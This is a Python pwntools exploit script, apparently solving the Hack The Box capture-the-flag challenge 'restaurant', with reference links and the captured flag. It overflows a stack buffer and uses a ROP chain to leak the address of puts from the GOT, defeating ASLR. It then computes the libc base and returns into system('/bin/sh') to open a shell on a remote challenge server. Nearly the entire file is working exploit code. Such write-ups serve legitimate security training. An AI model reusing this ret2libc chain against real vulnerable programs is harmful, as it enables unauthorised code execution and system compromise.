
### Notes:
# Extremely useful explanation of why return to libc works
# https://security.stackexchange.com/questions/136647/why-must-a-ret2libc-attack-follow-the-order-system-exit-command/136659#136659
# https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html
# https://www.ret2rop.com/2018/08/return-to-plt-got-to-bypass-aslr-remote.html
# https://www.ret2rop.com/2020/04/got-address-leak-exploit-unknown-libc.html
# https://book.hacktricks.xyz/misc/basic-python/rop-pwn-template
# https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro
# aslr command in gdb says it is not on, but repeatedly running ldd shows that the libc library moves around quite a bit

# 
from pwn import *
def show(p):
	a = p.recvline()
	print(a)

def main():
	LOCAL=False
	DEBUG = False
	elf = ELF('./restaurant')
	if LOCAL:
		p = elf.process()
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	else:
		host = "206.189.121.131"
		port = 30826
		p = remote(host, port)
		libc = ELF('libc.so.6')


	a = p.recvuntil("> ")
	p.sendline("1")
	a = p.recvuntil("> ")
	# overriding buffer and base pointer
	payload = b'A' * 31 + b'B' * 9
	# print out the address of puts
	pop_rdi_ret = 0x00000000004010a3
	ret = 0x000000000040063e
	puts_string = elf.got['puts']
	puts_call = elf.plt['puts']
	fill_call = elf.symbols["fill"]
	random_line_break = 0x004010fe	
	if DEBUG:
		# NEED TO ADD NEW LINE CHARACTER TO SEE WHERE THE ADDRESS OF FUNCTION IS
		payload += p64(pop_rdi_ret) + p64(random_line_break) + p64(puts_call) + p64(ret)
		payload += p64(pop_rdi_ret) + p64(puts_string) + p64(puts_call) + p64(fill_call)
		p.sendline(payload)
		for i in range(8):
			show(p)
	else:
		payload += p64(pop_rdi_ret) + p64(puts_string) + p64(puts_call) + p64(ret)
		payload += p64(pop_rdi_ret) + p64(puts_string) + p64(puts_call) + p64(fill_call)
		p.sendline(payload)
		# print("Sent payload")
		show(p)
		show(p)
		a = p.recvline().strip()
		print("returned value is ", a)
		a = a.hex().zfill(2)
		leaked_address = "".join([ a[i-2:i] for i in range(len(a), 0, -2) ])
		# leaked_address = int(a, 16)
		leaked_address = int(leaked_address, 16)
		print(leaked_address)

		
		# calculate the offset
		libc.address = leaked_address - libc.symbols['puts']
		# print("libc address", libc.address)
		# return into fill and system
		a = p.recvuntil("> ")
		# print(a)
		system = libc.symbols["system"]
		bin_sh = libc.search(b'/bin/sh').__next__()
		# print(system, bin_sh)
		# input()
		payload = b'A' * 40 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
		# payload = b'A' * 40 + p64(fill_call)
		p.sendline(payload)
		# payload = b'A' * 40 +  p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
		# print("Sending payload")
		# p.sendline(payload)

		# a = p.recvuntil("> ")
		# print(a)

		p.interactive()




if __name__ == '__main__':
	main()
	# HTB{r3turn_2_th3_r3st4ur4nt!}